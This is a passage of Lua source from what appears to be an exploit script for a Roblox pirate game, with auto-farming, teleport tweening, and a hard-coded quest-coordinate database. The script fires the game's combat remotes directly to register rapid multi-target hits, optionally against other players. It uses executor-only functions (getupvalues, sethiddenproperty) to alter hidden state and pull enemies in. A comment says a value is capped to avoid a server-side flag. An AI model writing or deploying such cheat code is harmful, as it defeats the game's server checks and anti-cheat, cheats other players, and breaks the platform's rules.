            pcall(function()
                if LocalPlayer.RequestStreamAroundAsync then
                    LocalPlayer:RequestStreamAroundAsync(hopTargetPos)
                end
            end)
            
            local hopTime = hopDist / speed
            local hopTween = TweenService:Create(root, TweenInfo.new(hopTime, Enum.EasingStyle.Linear), {CFrame = hopCF})
            CurrentTween = hopTween
            hopTween:Play()
            
            local arrivedHop = false
            local hopConn = hopTween.Completed:Connect(function()
                arrivedHop = true
            end)
            
            local tStart = tick()
            while not arrivedHop and (tick() - tStart) < (hopTime + 1.5) and IsTravelingSky and root and root.Parent do
                task.wait(0.1)
            end
            if hopConn then hopConn:Disconnect() end
            
            -- Waypoint touch reset: zero velocity and reset server replication accumulator
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
            task.wait(0.04)
        end
        
        if monConn then monConn:Disconnect() end
        
        if not root or not root.Parent or not IsTravelingSky then
            StopTween()
            return
        end
        
        -- Pre-stream terrain again directly above destination
        pcall(function()
            if LocalPlayer.RequestStreamAroundAsync then
                LocalPlayer:RequestStreamAroundAsync(targetPos)
            end
        end)
        
        -- Step 3: Gentle straight descent onto destination + 2.5 studs above ground
        local landCF = targetCFrame * CFrame.new(0, 2.5, 0)
        local downDist = (landCF.Position - root.Position).Magnitude
        local downTween = TweenService:Create(root, TweenInfo.new(downDist / speed, Enum.EasingStyle.Linear), {CFrame = landCF})
        CurrentTween = downTween
        downTween:Play()
        downTween.Completed:Wait()
        
        -- CLEAN SAFE ARRIVAL (Zero Rubberbanding, solid ground lock)
        if CarpetConn then CarpetConn:Disconnect(); CarpetConn = nil end
        if FlightCarpet and FlightCarpet.Parent then FlightCarpet:Destroy(); FlightCarpet = nil end
        
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
        root.CFrame = landCF
        
        if hum and hum.Parent then
            hum.PlatformStand = false
            hum.Sit = false
        end
        
        IsTravelingSky = false
        CurrentTween = nil
        CurrentTargetPos = nil
        HoverLock(landCF)
        if SetTravelHUD then SetTravelHUD(false) end
        
        if _G.Config.AutoSetSpawn then
            task.spawn(function()
                task.wait(0.3)
                local cf = CommF()
                if cf then pcall(function() cf:InvokeServer("SetSpawnPoint") end) end
            end)
        end
        
        -- Hold landing platform for 3 seconds so terrain geometry loads completely
        task.spawn(function()
            task.wait(0.5)
            DisableNoclip()
            task.wait(2.5)
            if LandingPlatform and LandingPlatform.Parent then
                LandingPlatform:Destroy()
                LandingPlatform = nil
            end
        end)
    end)
    
    return CurrentTween
end
local function TeleportToIsland(targetCFrame, islandName)
    _G.Config.AutoFarmLevel = false
    _G.Config.FarmSelectedMob = false
    _G.Config.FarmSelectedBoss = false
    _G.Config.FarmAllBosses = false
    
    StopTween()
    TweenTo(targetCFrame, islandName or "Selected Island", false)
end

_G.TweenTo = TweenTo
_G.StopTween = StopTween
_G.HoverLock = HoverLock
_G.TeleportToIsland = TeleportToIsland
--============================== FAST ATTACK & SKILL ENGINE ==============================
local _lastAttackTime = 0
local _lastSkillCastTime = 0
local _skillCycle = {"Z", "X", "C", "V", "F"}
local _skillCycleIndex = 1

-- Resolve Net Remotes with deep-scan fallback
local function ResolveCombatRemote(remoteName)
    local cached = _remoteCache["Combat_" .. remoteName]
    if cached and cached.Parent then return cached end
    
    local net = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("Net")
    if net then
        local r = net:FindFirstChild(remoteName) or net:FindFirstChild("RE/" .. remoteName)
        if r then
            _remoteCache["Combat_" .. remoteName] = r
            return r
        end
        local reFolder = net:FindFirstChild("RE")
        if reFolder then
            local r2 = reFolder:FindFirstChild(remoteName)
            if r2 then
                _remoteCache["Combat_" .. remoteName] = r2
                return r2
            end
        end
    end
    
    local fallback = GetRemote(remoteName, "RemoteEvent") or GetRemote("RE/" .. remoteName, "RemoteEvent")
    if fallback then
        _remoteCache["Combat_" .. remoteName] = fallback
        return fallback
    end
    return nil
end

local _cachedCFController = nil
local _cfLookupAttempted = 0
local function GetCombatController()
    if _cachedCFController then return _cachedCFController end
    local now = tick()
    if (now - _cfLookupAttempted) < 5.0 then return nil end
    _cfLookupAttempted = now
    
    pcall(function()
        local cfModule = LocalPlayer.PlayerScripts:FindFirstChild("CombatFramework")
        if cfModule then
            local cf = require(cfModule)
            if type(cf) == "table" then
                if cf.activeController then
                    _cachedCFController = cf.activeController
                elseif getupvalues or (debug and debug.getupvalues) then
                    local guv = getupvalues or debug.getupvalues
                    for _, val in pairs(guv(cf)) do
                        if type(val) == "table" and rawget(val, "activeController") then
                            _cachedCFController = val.activeController
                            break
                        end
                    end
                end
            end
        end
    end)
    return _cachedCFController
end

local function GetBladeHits()
    local targets = {}
    local root = GetRoot()
    if not root then return targets end
    
    local maxDist = math.min(_G.Config.AttackDistance or 60, 60)
    
    local function CheckPart(folder, isPlayerFolder)
        if not folder then return end
        for _, v in ipairs(folder:GetChildren()) do
            if v ~= LocalPlayer.Character and (not isPlayerFolder or _G.Config.AttackPlayers) then
                local hum = v:FindFirstChildOfClass("Humanoid")
                if hum and hum.Health > 0 then
                    local mobRoot = GetMobRoot(v)
                    if mobRoot and (mobRoot.Position - root.Position).Magnitude <= maxDist then
                        table.insert(targets, v)
                        if #targets >= 8 then return end
                    end
                end
            end
        end
    end
    
    CheckPart(Workspace:FindFirstChild("Enemies"), false)
    CheckPart(Workspace:FindFirstChild("SeaBeasts"), false)
    CheckPart(Workspace:FindFirstChild("SeaMonsters"), false)
    CheckPart(Workspace:FindFirstChild("BoatEnemies"), false)
    if _G.Config.AttackPlayers then
        CheckPart(Workspace:FindFirstChild("Characters"), true)
    end
    return targets
end

-- Fast M1 Clicks
local function FastAttack()
    if not _G.Config.FastAttack or not _G.Config.UseM1 then return end
    if IsTravelingSky then return end
    
    local char = GetCharacter()
    if not char then return end
    
    local selectedWep = NormalizeWeaponType(_G.Config.SelectedWeapon)
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool or not IsWeaponType(tool, selectedWep) then
        EquipWeapon(selectedWep)
        return
    end
    
    local now = tick()
    local cd = _G.Config.FastAttackSpeed or 0.015
    if (now - _lastAttackTime) < cd then return end
    _lastAttackTime = now
    
    local enemies = GetBladeHits()
    if #enemies > 0 then
        local controller = GetCombatController()
        if controller then
            controller.timeToNextAttack = 0
            controller.attacking = false
            controller.blocking = false
            if controller.humanoid then
                controller.humanoid.AutoRotate = true
            end
        end

        local regAttack = ResolveCombatRemote("RegisterAttack")
        local regHit = ResolveCombatRemote("RegisterHit")
        if regAttack and regHit then
            pcall(function()
                regAttack:FireServer(0.2)
                local hitList = {}
                local primaryPart = nil
                
                for _, v in ipairs(enemies) do
                    local part = v:FindFirstChild("Head") or GetMobRoot(v)
                    if part then
                        if not primaryPart then primaryPart = part end
                        table.insert(hitList, {v, part})
                    end
                end
                
                if primaryPart and #hitList > 0 then
                    regHit:FireServer(primaryPart, hitList)
                end
            end)
        end
        
        pcall(function() tool:Activate() end)
    end
end

-- Cast skills with selected weapon ONLY
local _skillCooldowns = { Z = 0, X = 0, C = 0, V = 0, F = 0 }
local _skillBaseCooldowns = { Z = 3.5, X = 5.0, C = 8.0, V = 12.0, F = 9.0 }

local function CastNextSkill()
    if not _G.Config.UseSkills or IsTravelingSky then return end
    
    local now = tick()
    if (now - _lastSkillCastTime) < 0.5 then return end
    
    local char = GetCharacter()
    if not char then return end
    local selectedWep = NormalizeWeaponType(_G.Config.SelectedWeapon)
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool or not IsWeaponType(tool, selectedWep) then
        EquipWeapon(selectedWep)
        return
    end
    
    local enemies = GetBladeHits()
    if #enemies == 0 then return end
    
    local allowedSkills = { Z = true, X = true }
    if selectedWep == "Melee" or selectedWep == "Sword" then
        allowedSkills.C = true
    elseif selectedWep == "Fruit" then
        allowedSkills.C = true
        allowedSkills.V = true
        allowedSkills.F = true
    end
    
    local chosenKey = nil
    for i = 1, #_skillCycle do
        local key = _skillCycle[_skillCycleIndex]
        _skillCycleIndex = (_skillCycleIndex % #_skillCycle) + 1
        
        if allowedSkills[key] and _G.Config["Skill_" .. key] then
            local lastUsed = _skillCooldowns[key] or 0
            local baseCD = _skillBaseCooldowns[key] or 4.0
            if (now - lastUsed) >= baseCD then
                chosenKey = key
                break
            end
        end
    end
    
    if chosenKey then
        _lastSkillCastTime = now
        _skillCooldowns[chosenKey] = now
        
        pcall(function()
            local targetRoot = GetMobRoot(enemies[1])
            local myRoot = GetRoot()
            if targetRoot and myRoot then
                myRoot.CFrame = CFrame.new(myRoot.Position, Vector3.new(targetRoot.Position.X, myRoot.Position.Y, targetRoot.Position.Z))
            end
        end)
        
        task.spawn(function()
            local VIM = game:GetService("VirtualInputManager")
            local keyCode = Enum.KeyCode[chosenKey]
            if VIM and keyCode then
                pcall(function()
                    VIM:SendKeyEvent(true, keyCode, false, game)
                    task.wait(0.05)
                    VIM:SendKeyEvent(false, keyCode, false, game)
                end)
            elseif keypress and keyrelease then
                local byte = string.byte(chosenKey)
                pcall(function()
                    keypress(byte)
                    task.wait(0.05)
                    keyrelease(byte)
                end)
            end
        end)
    end
end

local function IsInCombatMode()
    return _G.Config.AutoFarmLevel
        or _G.Config.FarmSelectedMob
        or _G.Config.FarmSelectedBoss
        or _G.Config.FarmAllBosses
        or _G.Config.AutoKillRipIndra
        or _G.Config.AutoKillDoughKing
        or _G.Config.AutoKillCakePrince
        or _G.Config.AutoKillSoulReaper
        or _G.Config.AutoKillDarkbeard
        or _G.Config.AutoKillCursedCaptain
        or _G.Config.AutoKillLaw
        or _G.Config.AutoLawRaid
        or _G.Config.AutoFarmRaid
        or _G.Config.AutoKillSeaBeast
        or _G.Config.AutoKillTerrorShark
        or _G.Config.AutoKillShark
        or _G.Config.AutoKillPiranha
        or _G.Config.AutoKillGhostShip
        or _G.Config.AutoTrainV4
        or _G.Config.AutoFarmBones
        or _G.Config.AutoRaceV4Trial
        or _G.Config.AutoCakePrinceSummon
        or _G.Config.AutoDoughKingSummon
end

local function StartCombatLoop()
    task.spawn(function()
        while true do
            local cd = _G.Config.FastAttackSpeed or 0.015
            task.wait(cd)
            if IsInCombatMode() then
                local canFight = not IsTravelingSky
                if not canFight then
                    local root = GetRoot()
                    local enemies = Workspace:FindFirstChild("Enemies")
                    if root and enemies then
                        for _, m in ipairs(enemies:GetChildren()) do
                            if m:IsA("Model") and m:FindFirstChild("Humanoid") and m.Humanoid.Health > 0 then
                                local mRoot = GetMobRoot(m)
                                if mRoot and (mRoot.Position - root.Position).Magnitude < 55 then
                                    canFight = true
                                    break
                                end
                            end
                        end
                    end
                end
                
                if canFight then
                    if _G.Config.FastAttack and _G.Config.UseM1 then
                        FastAttack()
                    end
                    if _G.Config.UseSkills then
                        CastNextSkill()
                    end
                    CheckBusoHaki()
                end
            end
        end
    end)
end

-- Robust mob name matcher (exact-normalized: strips tags, trims whitespace, case-insensitive)
local function IsMobMatch(mobName, targetName)
    if not mobName or not targetName then return false end
    if mobName == targetName then return true end
    local mLower = mobName:lower()
    local tLower = targetName:lower()
    if mLower == tLower then return true end
    
    -- Strip bracketed tags e.g. [Lv. 70], [Boss], [Spawned]
    local cleanMob = mLower:gsub("%s*%[.-%]%s*", " "):gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
    local cleanTarget = tLower:gsub("%s*%[.-%]%s*", " "):gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
    if cleanMob == cleanTarget then return true end
    
    return false
end

--============================== BRING MOBS SYSTEM (CAPPED SIM RADIUS) ==============================
local _simRadiusSet = false

local function BringMobsTo(targetMobName, centerCFrame)
    if not _G.Config.BringMobs then
        -- Reset sim radius when not actively bringing
        if _simRadiusSet then
            pcall(function()
                if sethiddenproperty then
                    sethiddenproperty(LocalPlayer, "SimulationRadius", 100)
                end
            end)
            _simRadiusSet = false
        end
        return
    end
    
    -- Cap at 1000 instead of math.huge to avoid server-side flag
    pcall(function()
        if sethiddenproperty then
            sethiddenproperty(LocalPlayer, "SimulationRadius", 1000)
            sethiddenproperty(LocalPlayer, "MaxSimulationRadius", 1000)
            _simRadiusSet = true
        end
    end)
    
    local enemies = Workspace:FindFirstChild("Enemies")
    if not enemies then return end
    
    for _, mob in ipairs(enemies:GetChildren()) do
        if IsMobMatch(mob.Name, targetMobName) and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
            local mobRoot = GetMobRoot(mob)
            if mobRoot then
                local dist = (mobRoot.Position - centerCFrame.Position).Magnitude
                if dist < 140 and dist > 4 then
                    mobRoot.CFrame = centerCFrame
                    for _, p in ipairs(mob:GetDescendants()) do
                        if p:IsA("BasePart") then p.CanCollide = false end
                    end
                    mob.Humanoid.WalkSpeed = 0
                end
            end
        end
    end
end

--============================== MASTER QUEST DATABASE ==============================
local QuestsDB = {
    -- Sea 1 (First Sea: Lv. 1 - 699)
    {Sea = 1, Min = 1, Max = 9, Quest = "BanditQuest1", Level = 1, Mob = "Bandit", NpcPos = CFrame.new(1059.37, 16.51, 1546.99), Pos = CFrame.new(1203.0, 12.0, 1563.0), MobPos = CFrame.new(1203.0, 12.0, 1563.0)},
    {Sea = 1, Min = 10, Max = 14, Quest = "JungleQuest", Level = 1, Mob = "Monkey", NpcPos = CFrame.new(-1612.33, 36.85, 149.13), Pos = CFrame.new(-1611.0, 29.0, 399.0), MobPos = CFrame.new(-1611.0, 29.0, 399.0)},
    {Sea = 1, Min = 15, Max = 29, Quest = "JungleQuest", Level = 2, Mob = "Gorilla", NpcPos = CFrame.new(-1612.33, 36.85, 149.13), Pos = CFrame.new(-1240.0, 16.0, -495.0), MobPos = CFrame.new(-1240.0, 16.0, -495.0)},
    {Sea = 1, Min = 30, Max = 39, Quest = "BuggyQuest1", Level = 1, Mob = "Pirate", NpcPos = CFrame.new(-1152.0, 16.8, 3863.0), Pos = CFrame.new(-1286.0, 18.0, 3886.0), MobPos = CFrame.new(-1286.0, 18.0, 3886.0)},
    {Sea = 1, Min = 40, Max = 59, Quest = "BuggyQuest1", Level = 2, Mob = "Brute", NpcPos = CFrame.new(-1152.0, 16.8, 3863.0), Pos = CFrame.new(-943.0, 29.0, 4387.0), MobPos = CFrame.new(-943.0, 29.0, 4387.0)},
    {Sea = 1, Min = 60, Max = 74, Quest = "DesertQuest", Level = 1, Mob = "Desert Bandit", NpcPos = CFrame.new(931.38, 4.68, 4198.21), Pos = CFrame.new(931.0, 7.5, 4510.0), MobPos = CFrame.new(931.0, 7.5, 4510.0)},
    {Sea = 1, Min = 75, Max = 89, Quest = "DesertQuest", Level = 2, Mob = "Desert Officer", NpcPos = CFrame.new(931.38, 4.68, 4198.21), Pos = CFrame.new(1572.0, 14.0, 4158.0), MobPos = CFrame.new(1572.0, 14.0, 4158.0)},
    {Sea = 1, Min = 90, Max = 99, Quest = "SnowQuest", Level = 1, Mob = "Snow Bandit", NpcPos = CFrame.new(1384.81, 87.27, -1298.47), Pos = CFrame.new(1364.0, 77.0, -1430.0), MobPos = CFrame.new(1364.0, 77.0, -1430.0)},
    {Sea = 1, Min = 100, Max = 119, Quest = "SnowQuest", Level = 2, Mob = "Snowman", NpcPos = CFrame.new(1384.81, 87.27, -1298.47), Pos = CFrame.new(1121.0, 98.0, -1670.0), MobPos = CFrame.new(1121.0, 98.0, -1670.0)},
    {Sea = 1, Min = 120, Max = 149, Quest = "MarineQuest2", Level = 1, Mob = "Chief Petty Officer", NpcPos = CFrame.new(-5036.0, 28.0, 4324.0), Pos = CFrame.new(-4837.0, 16.0, 4465.0), MobPos = CFrame.new(-4837.0, 16.0, 4465.0)},
    {Sea = 1, Min = 150, Max = 174, Quest = "SkyQuest", Level = 1, Mob = "Sky Bandit", NpcPos = CFrame.new(-4839.53, 717.67, -2619.44), Pos = CFrame.new(-5015.0, 280.0, -973.0), MobPos = CFrame.new(-5015.0, 280.0, -973.0)},
    {Sea = 1, Min = 175, Max = 189, Quest = "SkyQuest", Level = 2, Mob = "Dark Master", NpcPos = CFrame.new(-4839.53, 717.67, -2619.44), Pos = CFrame.new(-5270.0, 504.0, -462.0), MobPos = CFrame.new(-5270.0, 504.0, -462.0)},
    {Sea = 1, Min = 190, Max = 209, Quest = "PrisonerQuest", Level = 1, Mob = "Prisoner", NpcPos = CFrame.new(4875.33, 16.50, 735.45), Pos = CFrame.new(5057.0, 7.0, 567.0), MobPos = CFrame.new(5057.0, 7.0, 567.0)},
    {Sea = 1, Min = 210, Max = 249, Quest = "PrisonerQuest", Level = 2, Mob = "Dangerous Prisoner", NpcPos = CFrame.new(4875.33, 16.50, 735.45), Pos = CFrame.new(5393.0, 16.0, 795.0), MobPos = CFrame.new(5393.0, 16.0, 795.0)},
    {Sea = 1, Min = 250, Max = 274, Quest = "ColosseumQuest", Level = 1, Mob = "Toga Warrior", NpcPos = CFrame.new(-1588.34, 16.50, -2982.52), Pos = CFrame.new(-1695.0, 9.0, -2634.0), MobPos = CFrame.new(-1695.0, 9.0, -2634.0)},
    {Sea = 1, Min = 275, Max = 299, Quest = "ColosseumQuest", Level = 2, Mob = "Gladiator", NpcPos = CFrame.new(-1588.34, 16.50, -2982.52), Pos = CFrame.new(-1162.0, 11.0, -3098.0), MobPos = CFrame.new(-1162.0, 11.0, -3098.0)},
    {Sea = 1, Min = 300, Max = 324, Quest = "MagmaQuest", Level = 1, Mob = "Military Soldier", NpcPos = CFrame.new(-5315.0, 12.0, 8515.0), Pos = CFrame.new(-5338.0, 17.0, 8629.0), MobPos = CFrame.new(-5338.0, 17.0, 8629.0)},
    {Sea = 1, Min = 325, Max = 374, Quest = "MagmaQuest", Level = 2, Mob = "Military Spy", NpcPos = CFrame.new(-5315.0, 12.0, 8515.0), Pos = CFrame.new(-5890.0, 76.0, 8723.0), MobPos = CFrame.new(-5890.0, 76.0, 8723.0)},
    {Sea = 1, Min = 375, Max = 399, Quest = "FishmanQuest", Level = 1, Mob = "Fishman Warrior", NpcPos = CFrame.new(61122.65, 18.50, 1569.40), Pos = CFrame.new(60736.0, 23.0, 1396.0), MobPos = CFrame.new(60736.0, 23.0, 1396.0)},
    {Sea = 1, Min = 400, Max = 449, Quest = "FishmanQuest", Level = 2, Mob = "Fishman Commando", NpcPos = CFrame.new(61122.65, 18.50, 1569.40), Pos = CFrame.new(61887.0, 24.0, 1232.0), MobPos = CFrame.new(61887.0, 24.0, 1232.0)},
    {Sea = 1, Min = 450, Max = 474, Quest = "SkyExp1Quest", Level = 1, Mob = "God's Guard", NpcPos = CFrame.new(-4721.89, 843.87, -1949.97), Pos = CFrame.new(-4083.0, 1087.0, -415.0), MobPos = CFrame.new(-4083.0, 1087.0, -415.0)},
    {Sea = 1, Min = 475, Max = 524, Quest = "SkyExp1Quest", Level = 2, Mob = "Shanda", NpcPos = CFrame.new(-7894.62, 5545.49, -380.41), Pos = CFrame.new(-5879.0, 5470.0, 1864.0), MobPos = CFrame.new(-5879.0, 5470.0, 1864.0)},
    {Sea = 1, Min = 525, Max = 549, Quest = "SkyExp2Quest", Level = 1, Mob = "Royal Squad", NpcPos = CFrame.new(-7906.82, 5635.96, -1411.99), Pos = CFrame.new(-6707.0, 5551.0, 1155.0), MobPos = CFrame.new(-6707.0, 5551.0, 1155.0)},
    {Sea = 1, Min = 550, Max = 624, Quest = "SkyExp2Quest", Level = 2, Mob = "Royal Soldier", NpcPos = CFrame.new(-7748.21, 5606.84, -1443.43), Pos = CFrame.new(-6939.0, 5541.0, 963.0), MobPos = CFrame.new(-6939.0, 5541.0, 963.0)},
    {Sea = 1, Min = 625, Max = 649, Quest = "FountainQuest", Level = 1, Mob = "Galley Pirate", NpcPos = CFrame.new(5589.90, 16.50, 3995.78), Pos = CFrame.new(5327.0, 76.0, 4014.0), MobPos = CFrame.new(5327.0, 76.0, 4014.0)},
    {Sea = 1, Min = 650, Max = 699, Quest = "FountainQuest", Level = 2, Mob = "Galley Captain", NpcPos = CFrame.new(5649.03, 38.51, 4937.42), Pos = CFrame.new(5899.0, 76.0, 4809.0), MobPos = CFrame.new(5899.0, 76.0, 4809.0)},

    -- Sea 2 (Second Sea: Lv. 700 - 1499)
    {Sea = 2, Min = 700, Max = 724, Quest = "Area1Quest", Level = 1, Mob = "Raider", Pos = CFrame.new(-429.54, 72.99, 1836.18)},
    {Sea = 2, Min = 725, Max = 774, Quest = "Area1Quest", Level = 2, Mob = "Mercenary", Pos = CFrame.new(-960.61, 74.38, 1729.07)},
    {Sea = 2, Min = 775, Max = 799, Quest = "Area2Quest", Level = 1, Mob = "Swan Pirate", Pos = CFrame.new(878.01, 121.98, 1235.35)},
    {Sea = 2, Min = 800, Max = 874, Quest = "Area2Quest", Level = 2, Mob = "Factory Staff", Pos = CFrame.new(295.34, 73.01, -56.55)},
    {Sea = 2, Min = 875, Max = 899, Quest = "MarineQuest3", Level = 1, Mob = "Marine Lieutenant", Pos = CFrame.new(-2806.12, 72.96, -3038.55)},
    {Sea = 2, Min = 900, Max = 949, Quest = "MarineQuest3", Level = 2, Mob = "Marine Rear Admiral", Pos = CFrame.new(-3424.41, 72.96, -2997.74)},
    {Sea = 2, Min = 950, Max = 974, Quest = "ZombieQuest", Level = 1, Mob = "Zombie", Pos = CFrame.new(-5418.89, 48.52, -774.75)},
    {Sea = 2, Min = 975, Max = 999, Quest = "ZombieQuest", Level = 2, Mob = "Vampire", Pos = CFrame.new(-6033.86, 6.44, -1316.51)},
    {Sea = 2, Min = 1000, Max = 1049, Quest = "SnowMountainQuest", Level = 1, Mob = "Snow Trooper", Pos = CFrame.new(608.24, 401.52, -5372.46)},
    {Sea = 2, Min = 1050, Max = 1099, Quest = "SnowMountainQuest", Level = 2, Mob = "Winter Warrior", Pos = CFrame.new(1157.44, 430.12, -5187.52)},
    {Sea = 2, Min = 1100, Max = 1124, Quest = "IceSideQuest", Level = 1, Mob = "Lab Subordinate", Pos = CFrame.new(-5775.29, 42.44, -4465.17)},
    {Sea = 2, Min = 1125, Max = 1174, Quest = "FireSideQuest", Level = 1, Mob = "Horned Warrior", Pos = CFrame.new(-6411.39, 15.96, -5836.78)},
    {Sea = 2, Min = 1175, Max = 1199, Quest = "FireSideQuest", Level = 2, Mob = "Magma Ninja", Pos = CFrame.new(-5430.72, 76.96, -5949.19)},
    {Sea = 2, Min = 1200, Max = 1249, Quest = "FireSideQuest", Level = 2, Mob = "Lava Pirate", Pos = CFrame.new(-5223.12, 55.96, -4783.21)},
    {Sea = 2, Min = 1250, Max = 1274, Quest = "ShipQuest1", Level = 1, Mob = "Ship Deckhand", Pos = CFrame.new(1198.81, 125.12, 32986.92)},
    {Sea = 2, Min = 1275, Max = 1299, Quest = "ShipQuest1", Level = 2, Mob = "Ship Engineer", Pos = CFrame.new(918.42, 125.12, 32884.28)},
    {Sea = 2, Min = 1300, Max = 1324, Quest = "ShipQuest2", Level = 1, Mob = "Ship Steward", Pos = CFrame.new(915.24, 125.12, 33458.12)},
    {Sea = 2, Min = 1325, Max = 1349, Quest = "ShipQuest2", Level = 2, Mob = "Ship Officer", Pos = CFrame.new(915.24, 180.12, 33458.12)},
    {Sea = 2, Min = 1350, Max = 1399, Quest = "FrostQuest", Level = 1, Mob = "Arctic Warrior", Pos = CFrame.new(6038.45, 28.25, -6231.25)},
    {Sea = 2, Min = 1400, Max = 1424, Quest = "FrostQuest", Level = 2, Mob = "Snow Lurker", Pos = CFrame.new(5560.13, 28.25, -6826.91)},
    {Sea = 2, Min = 1425, Max = 1449, Quest = "ForgottenQuest", Level = 1, Mob = "Sea Soldier", Pos = CFrame.new(-3054.44, 237.15, -10142.82)},
    {Sea = 2, Min = 1450, Max = 1499, Quest = "ForgottenQuest", Level = 2, Mob = "Water Fighter", Pos = CFrame.new(-3435.12, 237.15, -10534.21)},

    -- Sea 3 (Third Sea: Lv. 1500 - 3000)
    {Sea = 3, Min = 1500, Max = 1524, Quest = "PiratePortQuest", Level = 1, Mob = "Pirate Millionaire", Pos = CFrame.new(-290.74, 43.73, 5580.12)},
    {Sea = 3, Min = 1525, Max = 1574, Quest = "PiratePortQuest", Level = 2, Mob = "Pistol Billionaire", Pos = CFrame.new(-468.12, 74.21, 5945.32)},
    {Sea = 3, Min = 1575, Max = 1599, Quest = "DragonCrewQuest", Level = 1, Mob = "Dragon Crew Archer", Pos = CFrame.new(6594.12, 384.12, 142.54)},
    {Sea = 3, Min = 1600, Max = 1624, Quest = "DragonCrewQuest", Level = 2, Mob = "Dragon Crew Warrior", Pos = CFrame.new(6745.23, 384.12, -189.43)},
    {Sea = 3, Min = 1625, Max = 1649, Quest = "VenomCrewQuest", Level = 1, Mob = "Venomous Assailant", Pos = CFrame.new(5210.45, 601.23, 894.12)},
    {Sea = 3, Min = 1650, Max = 1699, Quest = "VenomCrewQuest", Level = 2, Mob = "Hydra Enforcer", Pos = CFrame.new(4512.34, 601.23, 1120.54)},
    {Sea = 3, Min = 1700, Max = 1724, Quest = "DeepForestIsland", Level = 1, Mob = "Marine Commodore", Pos = CFrame.new(2450.12, 73.12, -7320.45)},
    {Sea = 3, Min = 1725, Max = 1774, Quest = "DeepForestIsland", Level = 2, Mob = "Marine Rear Admiral", Pos = CFrame.new(2912.45, 73.12, -7640.12)},
    {Sea = 3, Min = 1775, Max = 1799, Quest = "DeepForestIsland2", Level = 1, Mob = "Fishman Raider", Pos = CFrame.new(-10520.12, 332.12, -8412.34)},
    {Sea = 3, Min = 1800, Max = 1824, Quest = "DeepForestIsland2", Level = 2, Mob = "Fishman Captain", Pos = CFrame.new(-10940.45, 332.12, -8890.12)},
    {Sea = 3, Min = 1825, Max = 1849, Quest = "DeepForestIsland3", Level = 1, Mob = "Forest Pirate", Pos = CFrame.new(-13250.12, 332.12, -7640.54)},
    {Sea = 3, Min = 1850, Max = 1899, Quest = "DeepForestIsland3", Level = 2, Mob = "Mythological Pirate", Pos = CFrame.new(-13560.34, 470.12, -6920.12)},
    {Sea = 3, Min = 1900, Max = 1924, Quest = "DeepForestIsland3", Level = 3, Mob = "Jungle Pirate", Pos = CFrame.new(-12120.45, 332.12, -10540.23)},
    {Sea = 3, Min = 1925, Max = 1974, Quest = "DeepForestIsland3", Level = 4, Mob = "Musketeer Pirate", Pos = CFrame.new(-13140.23, 390.12, -9650.34)},
    {Sea = 3, Min = 1975, Max = 1999, Quest = "HauntedQuest1", Level = 1, Mob = "Reborn Skeleton", Pos = CFrame.new(-8760.12, 141.12, 6050.23)},
    {Sea = 3, Min = 2000, Max = 2024, Quest = "HauntedQuest1", Level = 2, Mob = "Living Zombie", Pos = CFrame.new(-9120.34, 141.12, 5820.45)},
    {Sea = 3, Min = 2025, Max = 2049, Quest = "HauntedQuest2", Level = 1, Mob = "Demonic Soul", Pos = CFrame.new(-9520.45, 172.01, 6120.12)},
    {Sea = 3, Min = 2050, Max = 2074, Quest = "HauntedQuest2", Level = 2, Mob = "Possessed Mummy", Pos = CFrame.new(-9516.99, 12.01, 6078.47)},
    {Sea = 3, Min = 2075, Max = 2099, Quest = "NutsIslandQuest", Level = 1, Mob = "Peanut Scout", Pos = CFrame.new(-2120.34, 38.12, -10190.23)},
    {Sea = 3, Min = 2100, Max = 2124, Quest = "NutsIslandQuest", Level = 2, Mob = "Peanut President", Pos = CFrame.new(-2120.34, 38.12, -10520.45)},
    {Sea = 3, Min = 2125, Max = 2149, Quest = "IceCreamIslandQuest", Level = 1, Mob = "Ice Cream Chef", Pos = CFrame.new(-820.12, 65.12, -10940.34)},
    {Sea = 3, Min = 2150, Max = 2199, Quest = "IceCreamIslandQuest", Level = 2, Mob = "Ice Cream Commander", Pos = CFrame.new(-640.45, 65.12, -11250.12)},
    {Sea = 3, Min = 2200, Max = 2224, Quest = "CakeQuest1", Level = 1, Mob = "Cookie Crafter", Pos = CFrame.new(-2350.12, 38.12, -12020.34)},
    {Sea = 3, Min = 2225, Max = 2249, Quest = "CakeQuest1", Level = 2, Mob = "Cake Guard", Pos = CFrame.new(-1580.45, 38.12, -12340.12)},
    {Sea = 3, Min = 2250, Max = 2274, Quest = "CakeQuest2", Level = 1, Mob = "Baking Staff", Pos = CFrame.new(-1890.23, 38.12, -12950.45)},
    {Sea = 3, Min = 2275, Max = 2299, Quest = "CakeQuest2", Level = 2, Mob = "Head Baker", Pos = CFrame.new(-1920.45, 38.12, -13100.12)},
    {Sea = 3, Min = 2300, Max = 2324, Quest = "ChocQuest1", Level = 1, Mob = "Cocoa Warrior", Pos = CFrame.new(210.12, 24.12, -12350.34)},
    {Sea = 3, Min = 2325, Max = 2349, Quest = "ChocQuest1", Level = 2, Mob = "Chocolate Bar Battler", Pos = CFrame.new(450.45, 24.12, -12650.12)},
    {Sea = 3, Min = 2350, Max = 2374, Quest = "ChocQuest2", Level = 1, Mob = "Sweet Thief", Pos = CFrame.new(712.23, 24.12, -12890.45)},
    {Sea = 3, Min = 2375, Max = 2449, Quest = "ChocQuest2", Level = 2, Mob = "Candy Rebel", Pos = CFrame.new(890.45, 24.12, -13150.12)},
    {Sea = 3, Min = 2450, Max = 2474, Quest = "TikiQuest1", Level = 1, Mob = "Isle Champion", Pos = CFrame.new(-16520.12, 22.12, 60.34)},
    {Sea = 3, Min = 2475, Max = 2499, Quest = "TikiQuest1", Level = 2, Mob = "Island Boy", Pos = CFrame.new(-16800.45, 22.12, 240.12)},
    {Sea = 3, Min = 2500, Max = 2524, Quest = "TikiQuest2", Level = 1, Mob = "Sun-kissed Warrior", Pos = CFrame.new(-16240.23, 22.12, -250.45)},
    {Sea = 3, Min = 2525, Max = 2549, Quest = "TikiQuest2", Level = 2, Mob = "Isle Outlaw", Pos = CFrame.new(-16500.45, 22.12, -450.12)},
